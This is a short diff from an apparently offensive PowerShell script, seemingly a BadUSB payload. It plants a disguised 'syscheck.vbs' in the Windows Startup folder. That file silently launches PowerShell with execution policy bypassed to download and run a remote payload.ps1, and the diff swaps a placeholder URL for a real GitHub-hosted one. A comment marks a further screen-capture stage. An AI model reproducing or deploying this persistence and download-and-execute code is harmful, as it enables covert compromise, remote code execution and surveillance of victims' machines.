@@ -68,7 +68,7 @@ Start-Job -ScriptBlock {
 $wscriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\syscheck.vbs"  
 @"  
 Set objShell = CreateObject("WScript.Shell")  
-objShell.Run "powershell -Exec Bypass -Window Hidden -C `"IEX (New-Object Net.WebClient).DownloadString('http://YOUR_RAW_PS1_URL/payload.ps1')`"", 0  
+objShell.Run "powershell -Exec Bypass -Window Hidden -C `"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/138I5/badusb/refs/heads/main/payload.ps1')`"", 0  
 "@ | Out-File $wscriptPath -Encoding ASCII  
 
 # Stage 5: Lightweight Screen Capture (JPEG2000 + Chunking)  
